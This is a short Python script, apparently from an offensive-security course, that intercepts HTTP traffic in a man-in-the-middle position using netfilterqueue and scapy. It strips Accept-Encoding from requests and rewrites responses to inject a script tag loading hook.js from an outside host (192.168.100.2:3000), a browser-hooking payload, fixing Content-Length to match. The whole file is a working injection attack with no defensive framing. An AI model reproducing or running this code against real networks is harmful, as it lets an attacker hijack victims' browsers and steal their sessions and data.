#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import re


def set_load(scapy_packet, load):
    scapy_packet[scapy.Raw].load = load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum
    return scapy_packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 10000:
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            # load = load.replace("HTTP/1.1", "HTTP/1.0")
        elif scapy_packet[scapy.TCP].sport == 10000:
            print("[+] Response")
            injection_code = '<script src="http://192.168.100.2:3000/hook.js"></script></body>'
            # injection_code = '<script>alert("code inject from middle man");</script></body>'
            load = load.replace("</body>", injection_code)
            content_lenght_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_lenght_search:
                content_lenght = content_lenght_search.group(1)
                new_content_lenght = int(content_lenght) + len(injection_code)
                load = load.replace(content_lenght, str(new_content_lenght))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
